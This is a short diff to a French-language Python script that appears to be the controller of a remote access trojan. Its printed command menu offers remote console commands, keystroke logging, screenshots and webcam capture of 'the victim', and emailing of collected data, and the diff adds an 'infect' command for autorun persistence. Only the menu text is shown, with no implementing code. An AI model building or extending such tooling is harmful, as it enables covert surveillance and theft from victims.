@@ -56,6 +56,7 @@ print("Liste des commandes: \n- cmd (permet l'utilisation des commandes consoles
 	\n- kelloggs (enregistre toutes les frappes au clavier de la victime. Le serveur devient oqp)\
 	\n- scr camshot (prendre un screenshot ou une image de la webcam de la victime) \
 	\n- rcv (recevoir toutes les données collectées par mail) \
+	\n- infect (autorun, besoin d'un mode admin) \
 	\n- quit")
 msg_a_envoyer = b""
 
